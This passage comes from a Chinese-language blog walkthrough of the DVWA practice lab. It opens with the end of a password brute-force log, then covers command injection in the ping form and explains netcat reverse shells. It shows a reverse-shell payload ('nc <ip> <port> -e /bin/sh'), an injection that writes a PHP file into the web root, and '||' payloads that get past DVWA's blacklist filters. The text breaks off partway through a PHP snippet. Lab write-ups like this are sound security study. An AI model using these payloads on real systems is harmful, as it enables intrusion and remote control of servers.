[-] try password: roots
[-] try password: test
[-] try password: test1
[-] try password: test123
[-] try password: test2
[-] try password: password
[+] Done! password is &amp;#39;password&amp;#39;
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>值得注意的是不清楚是不是因为我跑在容器里而且虚拟机只分配了 2C 1G 的缘故，每次尝试密码耗时都接近 1s。放在真实场景下，服务端如果限制了请求频率（或者把每个请求都用固定时间返回，如 1s），破解成本会骤然提高（不过对服务器来说固定返回时间也是有不低的成本的）。&lt;/p>
&lt;h3 id="提高难度">提高难度&lt;/h3>
&lt;p>尝试把安全等级提高到 Medium 和 High 对暴力破解并没有什么用，不清楚是不是因为虚拟机太慢，单线程爆破没触发频率限制。但总之是和 Low 难度下没什么区别。&lt;/p>
&lt;p>提高到 Impossible ，开启 PHPIDS 也无济于事。&lt;/p>
&lt;p>可见系统设计再安全也顶不住人为因素，保险箱钥匙放在地毯下面的时候就算保险箱是振金做的也防不住贼啊。&lt;/p>
&lt;h2 id="command-injection">Command Injection&lt;/h2>
&lt;h3 id="信息收集-1">信息收集&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101128288.png"
width="690"
height="270"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101128288_hudbc3e0ef08e95f39b0817c51ecb3343a_23969_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101128288_hudbc3e0ef08e95f39b0817c51ecb3343a_23969_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101128288"
class="gallery-image"
data-flex-grow="255"
data-flex-basis="613px"
>&lt;/p>
&lt;p>介绍是 ping a device，尝试输入 localhost 提交：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101215860.png"
width="669"
height="389"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101215860_hu73799ffa0ce1f097b18a79596df7ca58_29483_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101215860_hu73799ffa0ce1f097b18a79596df7ca58_29483_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101215860"
class="gallery-image"
data-flex-grow="171"
data-flex-basis="412px"
>&lt;/p>
&lt;p>应该是执行了 &lt;code>ping -c 4 &amp;lt;用户输入&amp;gt;&lt;/code>。尝试随便输入什么东西会不会报错。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101354634.png"
width="673"
height="263"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101354634_hu858a6ebf2ce93a4713cb7043282bcd66_24133_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101354634_hu858a6ebf2ce93a4713cb7043282bcd66_24133_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101354634"
class="gallery-image"
data-flex-grow="255"
data-flex-basis="614px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101405231.png"
width="689"
height="283"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101405231_hua6af44221cab3062ad11653bd178989c_24076_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101405231_hua6af44221cab3062ad11653bd178989c_24076_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101405231"
class="gallery-image"
data-flex-grow="243"
data-flex-basis="584px"
>&lt;/p>
&lt;p>立刻返回了，什么也没发生。再尝试拼一个命令进去：&lt;code>localhost &amp;amp;&amp;amp; echo 123&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101538861.png"
width="679"
height="411"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101538861_hu8cdc8bc306ca76b2f4e643fe09f8e1bb_29778_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101538861_hu8cdc8bc306ca76b2f4e643fe09f8e1bb_29778_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101538861"
class="gallery-image"
data-flex-grow="165"
data-flex-basis="396px"
>&lt;/p>
&lt;p>注意到末尾输出了 123，说明存在命令执行。&lt;/p>
&lt;h3 id="准备-1">准备&lt;/h3>
&lt;p>能执行任意命令的话，悬念就不大了，进可攻退可守。&lt;/p>
&lt;p>对 &lt;code>/var/www/html&lt;/code> 有写权限的话可以直接写个一句话木马，或者通过 &lt;code>nc&lt;/code> 命令反弹 shell。&lt;/p>
&lt;p>顺便一体 nc 反弹 shell 我并不会（手动狗头）。所以还得先学一学怎么用 nc 反弹 shell，到底啥原理。&lt;/p>
&lt;p>先 &lt;code>man nc&lt;/code> 看看手册。&lt;/p>
&lt;blockquote>
&lt;p>NAME&lt;/p>
&lt;p>​ nc - TCP/IP swiss army knife&lt;/p>
&lt;p>SYNOPSIS&lt;/p>
&lt;p>​ nc [-options] hostname port[s] [ports] &amp;hellip;&lt;/p>
&lt;p>​ nc -l -p port [-options] [hostname] [port]&lt;/p>
&lt;/blockquote>
&lt;p>嘶&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>TCP/IP 瑞士军刀诶。&lt;/p>
&lt;blockquote>
&lt;p>netcat is a simple unix utility which reads and writes data across network connections, using TCP or UDP protocol. It is designed to be a reliable &amp;ldquo;back-end&amp;rdquo; tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. Netcat, or &amp;ldquo;nc&amp;rdquo; as the actual program is named, should have been supplied long ago as another one of those cryptic but standard Unix tools.&lt;/p>
&lt;/blockquote>
&lt;p>netcat（我就管它叫网猫了），看介绍是一个可以被其他程序或者脚本驱动的“后端”工具，也是网络调试和探索工具，能创建几乎所有类型的连接。这么说感觉还有点迷惑，看后文介绍就清楚多了。&lt;/p>
&lt;blockquote>
&lt;p>In the simplest usage, &amp;ldquo;nc host port&amp;rdquo; creates a TCP connection to the given port on the given target host. Your standard input is then sent to the host, and anything that comes back across the connection is sent to your standard output. This continues indefinitely, until the network side of the connection shuts down. Note that this behavior is different from most other applications which shut everything down and exit after an end-of-file on the standard input.&lt;/p>
&lt;p>Netcat can also function as a server, by listening for inbound connections on arbitrary ports and then doing the same reading and writing. With minor limitations, netcat doesn&amp;rsquo;t really care if it runs in &amp;ldquo;client&amp;rdquo; or &amp;ldquo;server&amp;rdquo; mode &amp;ndash; it still shovels data back and forth until there isn&amp;rsquo;t any more left. In either mode, shutdown can be forced after a configurable time of inactivity on the network side.&lt;/p>
&lt;/blockquote>
&lt;p>概括下值得关注的部分，就是网猫的两种工作模式。客户端模式下把 stdin 用连接转发，同时把收到的消息写到 stdout；服务器模式监听端口，同样转发 stdin 并把收到的消息写到 stdout 。&lt;/p>
&lt;p>剩下比较重要的就是几个命令行选项：&lt;/p>
&lt;ul>
&lt;li>&lt;code>-l&lt;/code> 指示网猫在服务器模式下工作，监听一个指定端口。&lt;/li>
&lt;li>&lt;code>-e&lt;/code> 指示网猫在连接后运行一个程序，程序的输入会变成从连接收到的信息，程序的输出会从连接发送出去。&lt;/li>
&lt;li>&lt;code>-s&lt;/code> 指示网猫监听的本地地址。&lt;/li>
&lt;/ul>
&lt;p>可以做个简单的实验熟悉下命令的使用，用 tmux 按 &lt;code>ctrl+b&lt;/code> &lt;code>&amp;quot;&lt;/code> &lt;code>ctrl+b&lt;/code> &lt;code>%&lt;/code> 切分两个窗口出来，一边执行 &lt;code>nc -l -s 0.0.0.0 -p 12345&lt;/code> 另一边执行 &lt;code>nc localhost 12345&lt;/code>。&lt;/p>
&lt;p>在执行 &lt;code>nc localhost 12345&lt;/code> 的这边网猫工作在客户端模式下，可以自由尝试在两边键盘输入什么东西，另一边都会实时回显：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422134806970.png"
width="1253"
height="110"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422134806970_hue4c2b6d980755bce46f80b71b58199b9_168449_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422134806970_hue4c2b6d980755bce46f80b71b58199b9_168449_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422134806970"
class="gallery-image"
data-flex-grow="1139"
data-flex-basis="2733px"
>&lt;/p>
&lt;p>现在解释网猫反向shell就很简单了，用 &lt;code>nc localhost 12345 -e /bin/sh&lt;/code> 连接服务器，此时 &lt;code>/bin/sh&lt;/code> 的输入输出被接管，我们在服务端输入 &lt;code>ls&lt;/code>，客户端的 &lt;code>/bin/sh&lt;/code> 读到的输入就是 &lt;code>ls&lt;/code>，&lt;code>/bin/sh&lt;/code> 执行 &lt;code>ls&lt;/code> 的结果又返回到服务端——&lt;code>nc&lt;/code>客户端就成了一个类似sshd的角色，故称反向连接。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135301963.png"
width="799"
height="204"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135301963_hu5f0c0379ce9d698f046ca7a92259ac1e_234796_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135301963_hu5f0c0379ce9d698f046ca7a92259ac1e_234796_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422135301963"
class="gallery-image"
data-flex-grow="391"
data-flex-basis="940px"
>&lt;/p>
&lt;h3 id="构造-payload">构造 payload&lt;/h3>
&lt;p>先尝试用网猫反向连接。输入内容改成 &lt;code>localhost &amp;amp;&amp;amp; nc &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; -e /bin/sh &amp;amp;&lt;/code> ，等待连接。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135847026.png"
width="341"
height="41"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135847026_hu8aca9c9f3b1ddcde7b50574d9ad5b6e8_10075_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135847026_hu8aca9c9f3b1ddcde7b50574d9ad5b6e8_10075_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422135847026"
class="gallery-image"
data-flex-grow="831"
data-flex-basis="1996px"
>&lt;/p>
&lt;p>没成功。网页显示 ping 命令的输出，看了眼 dvwa 容器的日志发现提示没有&lt;code>nc&lt;/code>命令。&lt;/p>
&lt;p>好吧，上面那么多话到最后还是没有屁用。那就改成提交一个 php 一句话。输入内容改为 &lt;code>localhost &amp;amp;&amp;amp; echo '&amp;lt;?php phpinfo(); ?&amp;gt;' &amp;gt; /var/www/html/1.php&lt;/code>，然后访问 &lt;code>http://localhost:8080/1.php&lt;/code>，发现成功显示 phpinfo，done。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861.png"
width="1248"
height="366"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861_hu3476fd340cc0dbca84661fbd196275c9_38452_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861_hu3476fd340cc0dbca84661fbd196275c9_38452_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422140459588"
class="gallery-image"
data-flex-grow="340"
data-flex-basis="818px"
>&lt;/p>
&lt;h3 id="提高难度medium">提高难度：Medium&lt;/h3>
&lt;p>在 Medium 难度下 直接注入 &lt;code>localhost &amp;amp;&amp;amp; echo 123&lt;/code> 会发现没有 &lt;code>123&lt;/code> 回显了，日志里出现 &lt;code>ping: unknown host&lt;/code> 的错误，初步怀疑是对 &lt;code>&amp;amp;&amp;amp;&lt;/code> 做了过滤。&lt;/p>
&lt;p>DVWA 是个白盒，我也不用瞎试，直接点开 view source 审计下代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;ip&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Set blacklist
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;amp;&amp;amp;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Remove any of the charactars in the array (blacklist).
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_keys&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="nv">$substitutions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Determine OS and execute the ping command.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">stristr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">php_uname&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;s&amp;#39;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s1">&amp;#39;Windows NT&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Windows
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// *nix
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping -c 4 &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Feedback for the end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$cmd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>注意到把 &lt;code>&amp;amp;&amp;amp;&lt;/code> 和 &lt;code>;&lt;/code> 去除了，但这个过滤显然是不完善的。起码我一下子就能想到还可以&lt;code>||&lt;/code>或者&lt;code>|&lt;/code>，还有&lt;code>$()&lt;/code>之类的方式。&lt;/p>
&lt;p>把先前的 payload 改成 &lt;code>notexists || echo 123&lt;/code> 再提交。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153010236.png"
width="674"
height="140"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153010236_hu4c2f178bd8960d6bc4449f63040b6b19_5338_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153010236_hu4c2f178bd8960d6bc4449f63040b6b19_5338_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422153010236"
class="gallery-image"
data-flex-grow="481"
data-flex-basis="1155px"
>&lt;/p>
&lt;p>可以看到 &lt;code>echo 123&lt;/code> 已经被执行了，剩下的就是 get shell 了。&lt;/p>
&lt;h3 id="提高难度high">提高难度：High&lt;/h3>
&lt;p>High 难度下用 Medium 难度的 Payload 也能直接 bypass，有点意外。虽然已经过了，但还是再审计下 High 难度下的代码，看看和 Medium 难度有什么不同。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;ip&amp;#39;&lt;/span> &lt;span class="p">]);&lt;/span>
&lt;span class="c1">// Set blacklist
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;amp;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;| &amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;$&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;(&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;)&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;`&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;||&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Remove any of the charactars in the array (blacklist).
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_keys&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="nv">$substitutions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Determine OS and execute the ping command.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">stristr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">php_uname&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;s&amp;#39;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s1">&amp;#39;Windows NT&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Windows
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// *nix
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping -c 4 &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Feedback for the end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$cmd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>王德发？&lt;/p>
&lt;p>这不是已经滤掉了 &lt;code>||&lt;/code> 吗，为什么 &lt;code>notexists || echo 123&lt;/code> 这个 payload 还是显示了 &lt;code>123&lt;/code>？&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153514135.png"
width="888"
height="660"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153514135_hu6b2ed04736f2e8efc9ef7677bd7cca8b_48230_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153514135_hu6b2ed04736f2e8efc9ef7677bd7cca8b_48230_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422153514135"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="322px"
>&lt;/p>
&lt;p>我不理解，大受震撼。干脆开了个 php 解释器试一试 &lt;code>str_replace&lt;/code> 到底替换出来个什么鬼。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;notexists || echo 123&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
